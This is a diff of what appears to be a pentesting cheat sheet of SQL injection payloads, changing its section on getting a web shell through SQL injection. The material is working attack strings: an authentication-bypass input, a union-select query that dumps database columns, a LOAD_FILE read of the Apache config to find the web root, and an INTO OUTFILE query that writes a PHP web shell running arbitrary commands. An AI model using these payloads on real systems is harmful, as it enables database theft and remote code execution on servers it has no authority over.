@@ -39,9 +39,14 @@ admin' -- -
 -1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
 ```
 
-### Webshell via SQLI - MySQL
+### Webshell via SQLI
+-> view web server path  
 ```
 LOAD_FILE('/etc/httpd/conf/httpd.conf')    
+```
+
+-> creating webshell
+```
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
 ```
  
